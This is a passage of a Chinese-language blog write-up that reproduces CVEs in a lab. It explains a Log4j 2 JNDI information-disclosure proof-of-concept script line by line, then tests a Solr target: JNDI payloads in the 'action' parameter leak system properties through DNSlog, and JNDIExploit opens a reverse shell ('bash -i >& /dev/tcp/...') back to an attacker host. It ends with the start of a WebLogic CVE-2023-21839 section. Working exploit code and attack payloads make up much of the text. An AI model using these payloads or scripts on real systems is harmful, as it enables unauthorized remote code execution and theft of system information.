string\">'value to leak. '</span>\n                             'see<span class=\"token punctuation\">:</span>\nhttps<span class=\"token punctuation\">:</span><span class=\"token operator\">//</span>twitter<span class=\"token punctuation\">.</span>com<span class=\"token operator\">/</span>Rayhan0x01<span class=\"token operator\">/</span>status<span class=\"token operator\">/</span><span class=\"token number\">1469571563674505217</span> '\n                             <span class=\"token string\">'(default: ${;java:version};)'</span><span class=\"token punctuation\">)</span>\n    args <span class=\"token operator\">=</span> parser<span class=\"token punctuation\">.</span>parse_args<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>f<span class=\"token string\">' i| starting server on {;args.listen_host};:{;args.listen_port};'</span><span class=\"token punctuation\">)</span>\n    server <span class=\"token operator\">=</span> ThreadedTCPServer<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">.</span>listen_host<span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">.</span>listen_port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\nThreadedTCPRequestHandler<span class=\"token punctuation\">)</span>\n\n    serv_thread <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>server<span class=\"token punctuation\">.</span>serve_forever<span class=\"token punctuation\">)</span>\n    serv_thread<span class=\"token punctuation\">.</span>daemon <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span>\n    serv_thread<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>f<span class=\"token string\">' i| server started'</span><span class=\"token punctuation\">)</span>\n\n    payload <span class=\"token operator\">=</span> f<span class=\"token string\">'${;{;jndi:ldap://{;args.exploit_host};:{;args.listen_port};/{;args.leak};};};'</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>f<span class=\"token string\">' i| sending exploit payload {;payload}; to {;args.target};'</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n        r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">.</span>target<span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span><span class=\"token string\">'User-Agent'</span><span class=\"token punctuation\">:</span> payload<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>f<span class=\"token string\">' i| response status code: {;r.status_code};'</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>f<span class=\"token string\">' i| response: {;r.text};'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>f<span class=\"token string\">' e| failed to make request: {;e};'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">finally</span><span class=\"token punctuation\">:</span>\n        server<span class=\"token punctuation\">.</span>shutdown<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        server<span class=\"token punctuation\">.</span>server_close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n    main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>                \n</code></pre>\n<h3 id=\"信息泄露脚本分析\"><a href=\"#信息泄露脚本分析\" class=\"headerlink\" title=\"信息泄露脚本分析\"></a>信息泄露脚本分析</h3><h4 id=\"LDAP-HEADER\"><a href=\"#LDAP-HEADER\" class=\"headerlink\" title=\"LDAP_HEADER\"></a>LDAP_HEADER</h4><p>定义 <code>LDAP_HEADER</code> 常量，这是响应 <code>LDAP</code> 请求时使用的头信息</p>\n<pre class=\" language-python\"><code class=\"language-python\">LDAP_HEADER <span class=\"token operator\">=</span> b<span class=\"token string\">'\\x30\\x0c\\x02\\x01\\x01\\x61\\x07\\x0a\\x01\\x00\\x04\\x00\\x04\\x00\\x0a'</span>\n</code></pre>\n<h4 id=\"ThreadedTCPRequestHandler\"><a href=\"#ThreadedTCPRequestHandler\" class=\"headerlink\" title=\"ThreadedTCPRequestHandler\"></a>ThreadedTCPRequestHandler</h4><p>这里定义<code>ThreadedTCPRequestHandler</code> 类的 <code>handle()</code> 方法用于处理来自客户端的连接。</p>\n<p>该方法首先输出来自客户端的连接信息，然后通过调用 <code>sock.recv()</code> 和 <code>sock.sendall()</code> 方法读取客户端发送</p>\n<p>的数据，并发送响应数据</p>\n<pre class=\" language-python\"><code class=\"language-python\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">ThreadedTCPRequestHandler</span><span class=\"token punctuation\">(</span>socketserver<span class=\"token punctuation\">.</span>BaseRequestHandler<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">handle</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span><span class=\"token operator\">></span> None<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>f<span class=\"token string\">' i| new connection from {;self.client_address[0]};'</span><span class=\"token punctuation\">)</span>\n\n        sock <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>request\n        sock<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span>\n        sock<span class=\"token punctuation\">.</span>sendall<span class=\"token punctuation\">(</span>LDAP_HEADER<span class=\"token punctuation\">)</span>\n\n        data <span class=\"token operator\">=</span> sock<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span>\n        data <span class=\"token operator\">=</span> data<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span>  <span class=\"token comment\" spellcheck=\"true\"># strip header</span>\n\n        <span class=\"token comment\" spellcheck=\"true\"># example response</span>\n        <span class=\"token comment\" spellcheck=\"true\">#</span>\n        <span class=\"token comment\" spellcheck=\"true\"># ('Java version 11.0.13\\n'</span>\n        <span class=\"token comment\" spellcheck=\"true\">#  '\\x01\\x00\\n'</span>\n        <span class=\"token comment\" spellcheck=\"true\">#  '\\x01\\x03\\x02\\x01\\x00\\x02\\x01\\x00\\x01\\x01\\x00\\x0b'</span>\n        <span class=\"token comment\" spellcheck=\"true\">#  'objectClass0\\x00\\x1b0\\x19\\x04\\x172.16.840.1.113730.3.4.2')</span>\n\n        data <span class=\"token operator\">=</span> data<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span>errors<span class=\"token operator\">=</span><span class=\"token string\">'ignore'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>f<span class=\"token string\">' v| extracted value: {;data};'</span><span class=\"token punctuation\">)</span>\n</code></pre>\n<h4 id=\"ThreadedTCPServer\"><a href=\"#ThreadedTCPServer\" class=\"headerlink\" title=\"ThreadedTCPServer\"></a>ThreadedTCPServer</h4><p><code>ThreadedTCPServer</code> 类是一个多线程 <code>TCP</code> 服务器，它继承自 <code>socketserver.ThreadingMixIn</code> 和 </p>\n<p><code>socketserver.TCPServer</code> 类。这意味着它可以同时处理多个客户端连接。</p>\n<pre class=\" language-python\"><code class=\"language-python\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">ThreadedTCPServer</span><span class=\"token punctuation\">(</span>socketserver<span class=\"token punctuation\">.</span>ThreadingMixIn<span class=\"token punctuation\">,</span> socketserver<span class=\"token punctuation\">.</span>TCPServer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">pass</span>\n</code></pre>\n<h4 id=\"main\"><a href=\"#main\" class=\"headerlink\" title=\"main()\"></a>main()</h4><p>main()函数使用模块设置命令行参数解析器argparse，然后解析命令行参数。</p>\n<pre class=\" language-python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    parser <span class=\"token operator\">=</span> argparse<span class=\"token punctuation\">.</span>ArgumentParser<span class=\"token punctuation\">(</span>description<span class=\"token operator\">=</span><span class=\"token string\">'a simple log4j&lt;=2.14 information disclosure poc '</span>                              <span class=\"token string\">'(ref:https://twitter.com/Black2Fan/status/1470281005038817284)'</span><span class=\"token punctuation\">)</span>\n</code></pre>\n<p>下面的类似<code>-t,-lh,-lp</code>等等就是解析器设置为接受命令行参数</p>\n<pre class=\" language-python\"><code class=\"language-python\">    parser<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'--target'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-t'</span><span class=\"token punctuation\">,</span> required<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> help<span class=\"token operator\">=</span><span class=\"token string\">'target uri'</span><span class=\"token punctuation\">)</span>\n    parser<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'--listen-host'</span><span class=\"token punctuation\">,</span> default<span class=\"token operator\">=</span><span class=\"token string\">'0.0.0.0'</span><span class=\"token punctuation\">,</span>help<span class=\"token operator\">=</span><span class=\"token string\">'exploit server host to listen on(default: 127.0.0.1)'</span><span class=\"token punctuation\">)</span>\n    parser<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'--listen-port'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-lp'</span><span class=\"token punctuation\">,</span> default<span class=\"token operator\">=</span><span class=\"token number\">8888</span><span class=\"token punctuation\">,</span>\nhelp<span class=\"token operator\">=</span><span class=\"token string\">'exploit server port to listen on (default: 8888)'</span><span class=\"token punctuation\">)</span>\n    parser<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'--exploit-host'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-eh'</span><span class=\"token punctuation\">,</span> required<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span>\ndefault<span class=\"token operator\">=</span><span class=\"token string\">'127.0.0.1'</span><span class=\"token punctuation\">,</span>help<span class=\"token operator\">=</span><span class=\"token string\">'host where (this) exploit server is reachable'</span><span class=\"token punctuation\">)</span>\n    parser<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'--leak'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-l'</span><span class=\"token punctuation\">,</span> default<span class=\"token operator\">=</span><span class=\"token string\">'${;java:version};'</span><span class=\"token punctuation\">,</span>\n                        help<span class=\"token operator\">=</span><span class=\"token string\">'value to leak. '</span><span class=\"token string\">'see:https://twitter.com/Rayhan0x01/status/1469571563674505217 '</span><span class=\"token string\">'(default: ${;java:version};)'</span><span class=\"token punctuation\">)</span>\n</code></pre>\n<p><code>parse_args()</code> 方法用于解析命令行参数，并将解析后的参数值存储在一个名为 <code>args</code> 的变量中</p>\n<p>例如，在执行脚本后加的命令行参数<code>--listen-port 8080</code>就转变为了<code>args.listen_port = 8080</code>，这样在后续</p>\n<p>代码调用不同参数时，可直接调用<code>arg</code>来实现</p>\n<pre class=\" language-python\"><code class=\"language-python\">    args <span class=\"token operator\">=</span> parser<span class=\"token punctuation\">.</span>parse_args<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n</code></pre>\n<p>这里先创建一个基于线程的 <code>TCP</code> 服务器，并使用 <code>args.listen_host</code> 和 <code>args.listen_port</code> 来指定的主机和端</p>\n<p>口启动，并使用 <code>ThreadedTCPRequestHandler</code> 类来处理每个请求【也就是前面提到的】</p>\n<pre class=\" language-python\"><code class=\"language-python\">    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>f<span class=\"token string\">' i| starting server on {;args.listen_host};:{;args.listen_port};'</span><span class=\"token punctuation\">)</span>\n    server <span class=\"token operator\">=</span> ThreadedTCPServer<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">.</span>listen_host<span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">.</span>listen_port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\nThreadedTCPRequestHandler<span class=\"token punctuation\">)</span>\n</code></pre>\n<p>这里主要是先创建一个 <code>threading.Thread</code> 对象，并将服务器的 <code>serve_forever()</code> 方法作为其目标。这个方法</p>\n<p>就是字面意思，它会一直运行，直到服务器被关闭。</p>\n<pre class=\" language-python\"><code class=\"language-python\">    serv_thread <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>server<span class=\"token punctuation\">.</span>serve_forever<span class=\"token punctuation\">)</span>\n</code></pre>\n<p><code>daemon</code> 属性是 <code>Python</code> 中的线程特有属性，它表示该线程是否为守护线程，如果一个线程是守护线程，</p>\n<p>那么当程序退出时，它也会被中断。</p>\n<p>而这里的被设置为<code>ture</code>，所以这意味着程序退出时，线程将被中断。</p>\n<pre class=\" language-python\"><code class=\"language-python\"> serv_thread<span class=\"token punctuation\">.</span>daemon <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span>\n</code></pre>\n<p>然后就是启动线程，并延迟 <code>1</code> 秒钟，来确保服务器完全启动</p>\n<pre class=\" language-python\"><code class=\"language-python\">    serv_thread<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>f<span class=\"token string\">' i| server started'</span><span class=\"token punctuation\">)</span>\n\n    payload <span class=\"token operator\">=</span> f<span class=\"token string\">'${;{;jndi:ldap://{;args.exploit_host};:{;args.listen_port};/{;args.leak};};};'</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>f<span class=\"token string\">' i| sending exploit payload {;payload}; to {;args.target};'</span><span class=\"token punctuation\">)</span>\n</code></pre>\n<p>这里使用 <code>try-finally</code> 语句块向服务器发送<code>payload</code>:</p>\n<p><code>$&#123;&#123;jndi:ldap://&#123;args.exploit_host&#125;:&#123;args.listen_port&#125;/&#123;args.leak&#125;&#125;&#125;</code></p>\n<p>并打印服务器的响应状态码，以及响应的文本内容</p>\n<p>最后调用服务器的 <code>shutdown()</code> 和 <code>server_close()</code> 方法，以关闭服务器，即使在发送 <code>HTTP</code> 请求时发生异常也是如此。</p>\n<pre class=\" language-python\"><code class=\"language-python\">    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n        r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">.</span>target<span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span><span class=\"token string\">'User-Agent'</span><span class=\"token punctuation\">:</span> payload<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>f<span class=\"token string\">' i| response status code: {;r.status_code};'</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>f<span class=\"token string\">' i| response: {;r.text};'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>f<span class=\"token string\">' e| failed to make request: {;e};'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">finally</span><span class=\"token punctuation\">:</span>\n        server<span class=\"token punctuation\">.</span>shutdown<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        server<span class=\"token punctuation\">.</span>server_close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n</code></pre>\n<p>这里就是一个常见的语句，如果脚本是独立执行的，则直接就调用 <code>main()</code> 函数。</p>\n<pre class=\" language-python\"><code class=\"language-python\"><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n    main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>    \n</code></pre>\n<h2 id=\"渗透测试\"><a href=\"#渗透测试\" class=\"headerlink\" title=\"渗透测试\"></a>渗透测试</h2><h3 id=\"利用DNSlog验证漏洞\"><a href=\"#利用DNSlog验证漏洞\" class=\"headerlink\" title=\"利用DNSlog验证漏洞\"></a>利用DNSlog验证漏洞</h3><p>访问<code>http://www.dnslog.cn/</code></p>\n<p>先<code>Get SubDomain</code>获取一个子域名</p>\n<p><img src=\"/post/CVE-Test/image-20221220145121926.png\" alt=\"image-20221220145121926\"></p>\n<p>但是既然是注入，那肯定是存在参数注入点，查看官方<code>solr</code>文档，得到在<code>cores</code>里</p>\n<p><img src=\"/post/CVE-Test/image-20221220145505204.png\" alt=\"image-20221220145505204\"></p>\n<pre><code>/admin/cores?action=\n</code></pre>\n<p>其中<code>action</code>参数可控，有很大可能是注入点</p>\n<p>于是把我们的<code>dnslog</code>获取的子域名按<code>payload</code>形式添加到<code>url</code>后参数中</p>\n<pre><code>http://192.168.80.131:8983/solr/admin/cores?action=$&#123;jndi:ldap://4d5do5.dnslog.cn&#125;\n</code></pre>\n<p>访问查看</p>\n<p><code>DNSlog</code>收到了访问请求</p>\n<p><img src=\"/post/CVE-Test/image-20221220145131607.png\" alt=\"image-20221220145131607\"></p>\n<p>同时在靶机页面下也有<code>DNSlog</code>子域名回显，虽然是</p>\n<p><img src=\"/post/CVE-Test/image-20221220145054026.png\" alt=\"image-20221220145054026\"></p>\n<p>说明这里的<code>$&#123;jndi:ldap://eavgk6.dnslog.cn&#125;</code>，确实达到了访问的作用</p>\n<p>故此推断<code>log4j2</code>漏洞存在</p>\n<h3 id=\"信息泄露漏洞\"><a href=\"#信息泄露漏洞\" class=\"headerlink\" title=\"信息泄露漏洞\"></a>信息泄露漏洞</h3><p>这里可以利用脚本分析中<code>exploitdb</code>里的信息泄露脚本即可</p>\n<p>按照脚本原理也是利用占位符，也就是<code>payload</code>的形式，但是参数为系统属性，这些属性会自动返回对应的值，</p>\n<p>最后脚本通过对返回数据的解析，就可以得到敏感数据</p>\n<p>当然直接通过访问得到消息也是可以的</p>\n<p>比如<code>$&#123;sys:os.version&#125;</code>，就得到我们靶机的系统内核版本号为<code>5.15.0-56-generic</code></p>\n<pre><code>http://192.168.80.131:8983/solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:os.version&#125;.7b09py.dnslog.cn&#125;\n</code></pre>\n<p><img src=\"/post/CVE-Test/image-20221220220840849.png\" alt=\"image-20221220220840849\"></p>\n<p>对于<code>usr.name</code>，以及<code>os.name</code>等等都是可以实现</p>\n<pre><code>http://192.168.80.131:8983/solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:user.name&#125;.7b09py.dnslog.cn&#125;\n</code></pre>\n<p><img src=\"/post/CVE-Test/image-20221220175405653.png\" alt=\"image-20221220175405653\"></p>\n<p>以下就是在<code>log4j2</code>其他可用系统属性列表</p>\n<p><img src=\"/post/CVE-Test/image-20221220170944260.png\" alt=\"image-20221220170944260\"></p>\n<h3 id=\"远程代码执行漏洞\"><a href=\"#远程代码执行漏洞\" class=\"headerlink\" title=\"远程代码执行漏洞\"></a>远程代码执行漏洞</h3><pre><code>攻击机kali ip:192.168.80.128\n攻击机kali 监听端口:8888\n靶机ubuntu ip:192.168.80.131\n</code></pre>\n<h4 id=\"JNDIExploit-1-2-SNAPSHOT-jar利用JNDI注入反弹shell\"><a href=\"#JNDIExploit-1-2-SNAPSHOT-jar利用JNDI注入反弹shell\" class=\"headerlink\" title=\"JNDIExploit-1.2-SNAPSHOT.jar利用JNDI注入反弹shell\"></a>JNDIExploit-1.2-SNAPSHOT.jar利用JNDI注入反弹shell</h4><p>该工具的原理我剖析了一下，</p>\n<p>先启动工具</p>\n<pre><code>java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.80.128\n</code></pre>\n<p><img src=\"/post/CVE-Test/image-20221221163132059.png\" alt=\"image-20221221163132059\"></p>\n<p>简单来讲就是在攻击机【<code>192.168.80.128</code>】的的<code>1389</code>端口搭建起了一个服务器，其中放置了一个恶意类，</p>\n<p>通过利用靶机网站<code>JNDI</code>注入漏洞把这个恶意类进行远程加载，从而执行了命令</p>\n<p>利用<code>JNDIExploit-1.2-SNAPSHOT.jar</code>最好的就是简化了<code>1.0</code>的繁杂参数</p>\n<p>只需要构造<code>payload</code></p>\n<pre><code>http://192.168.80.131:8983/solr/admin/cores?action=$&#123;jndi:ldap://192.168.80.128:1389/Basic/ReverseShell/192.168.80.128/6666&#125;\n</code></pre>\n<p><code>/Basic/ReverseShell/</code>中其实就包含反弹<code>shell</code>的命令</p>\n<pre><code>bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/xxxx 0&gt;&amp;1\n*这里的\n/xx.xx.xx.xx/xxxx\n就是其后跟上的参数\n/192.168.80.128/6666\n</code></pre>\n<p>于是就是<code>/Basic/ReverseShell/192.168.80.128/6666</code>被恶意类包含</p>\n<p>然后在攻击机监听<code>6666</code>端口</p>\n<p><img src=\"/post/CVE-Test/image-20221221203418508.png\" alt=\"image-20221221203418508\"></p>\n<p>最后访问<code>payload</code>，触发</p>\n<p><img src=\"/post/CVE-Test/image-20221221203458628.png\" alt=\"image-20221221203458628\"></p>\n<p>成功反弹到<code>shell</code></p>\n<p><img src=\"/post/CVE-Test/image-20221221203538282.png\" alt=\"image-20221221203538282\"></p>\n<p>测试完毕</p>\n<h1 id=\"CVE-2022-39197-Cobaltstrike-RCE\"><a href=\"#CVE-2022-39197-Cobaltstrike-RCE\" class=\"headerlink\" title=\"CVE-2022-39197 Cobaltstrike RCE\"></a>CVE-2022-39197 Cobaltstrike RCE</h1><h2 id=\"环境搭建-1\"><a href=\"#环境搭建-1\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h2><h1 id=\"CVE-2023-21839-Weblogic远程代码执行漏洞\"><a href=\"#CVE-2023-21839-Weblogic远程代码执行漏洞\" class=\"headerlink\" title=\"CVE-2023-21839 Weblogic远程代码执行漏洞\"></a>CVE-2023-21839 Weblogic远程代码执行漏洞</h1><p>该漏洞的影响范围为<code>Weblogic 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0</code></p>\n<p>先在官方的进行修复更新文档中进行查看</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><a href=\"https://www.oracle.com/security-alerts/cpujan2023.html\">Oracle Critical Patch Update Advisory - January 2023</a></p></blockquote>\n<p><img src=\"/post/CVE-Test/image-20230226154457424.png\" alt=\"image-20230226154457424\"></p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">CVE-2023-21839</th>\n<th>Oracle WebLogic Server</th>\n<th>核心</th>\n<th>T3， IIOP</th>\n<th>是的</th>\n<th>7.5</th>\n<th>网络</th>\n<th>低</th>\n<th>没有</th>\n<th>没有</th>\n<th>未 更改</th>\n<th>高</th>\n<th>没有</th>\n<th>没有</th>\n<th>12.2.1.3.0 12.2.1.4.0 14.1.1.0.0</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">CVE-id</td>\n<td>产品</td>\n<td>元件</td>\n<td>协议</td>\n<td>无需身份验证即可远程利用。</td>\n<td>评分</td>\n<td>攻击向量</td>\n<td>攻复合体</td>\n<td>Privs’Req[权限提提升]</td>\n<td>用户交互</td>\n<td>范围</td>\n<td>倾诉</td>\n<td>内涵</td>\n<td>可用性</td>\n<td>版本</td>\n</tr>\n</tbody></table>\n<h2 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h2><h3 id=\"weblogic是什么？\"><a href=\"#weblogic是什么？\" class=\"headerlink\" title=\"weblogic是什么？\"></a>weblogic是什么？</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>WebLogic是<a href=\"https://baike.baidu.com/item/%E7%BE%8E%E5%9B%BDOracle%E5%85%AC%E5%8F%B8/9952086?fromModule=lemma_inlink\">美国Oracle公司</a>出品的一个application server，确切的说是一个基于<a href=\"https://baike.baidu.com/item/JAVAEE/3066623?fromModule=lemma_inlink\">JAVAEE</a>架构的<a 